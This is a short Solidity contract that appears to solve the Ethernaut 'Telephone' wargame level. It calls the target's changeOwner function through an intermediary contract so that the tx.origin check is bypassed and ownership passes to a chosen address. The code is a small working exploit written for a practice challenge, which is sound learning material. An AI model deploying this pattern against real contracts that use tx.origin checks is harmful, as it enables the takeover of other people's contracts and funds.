// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
    function owner() external returns (address);
}

contract Cracked4_Telephone {
    address ethernaut_contracts;
    constructor(address _ethernaut_contracts) {
        ethernaut_contracts = _ethernaut_contracts;
    }

    function attach(address owner) public {
        ITelephone(ethernaut_contracts).changeOwner(owner);
    }
}
